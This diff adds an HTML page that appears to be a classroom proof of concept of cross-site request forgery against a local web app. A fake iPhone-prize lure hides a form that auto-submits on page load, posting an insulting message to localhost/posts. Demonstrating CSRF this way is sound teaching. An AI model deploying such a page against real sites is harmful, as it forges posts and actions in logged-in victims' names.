@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Bạn đã trúng thưởng iPhone 16 Pro Max!</title>
+</head>
+
+<body>
+    <h1>Đang tải phần thưởng... Vui lòng đợi!</h1>
+
+    <!-- Đây là Form tàng hình, tự động gửi dữ liệu sang web mục tiêu -->
+    <form id="csrf_form" action="http://localhost/posts" method="POST" style="display: none;">
+        <!-- Không có CSRF Token ở đây -->
+        <input type="hidden" name="content" value="Sếp là một tên ngốc! Tôi muốn nghỉ việc ngay hôm nay!!!">
+    </form>
+
+    <script>
+        // Lệnh tự động bóp cò (Submit) ngay khi nạn nhân vừa mở web
+        document.getElementById("csrf_form").submit();
+    </script>
+</body>
+
+</html>
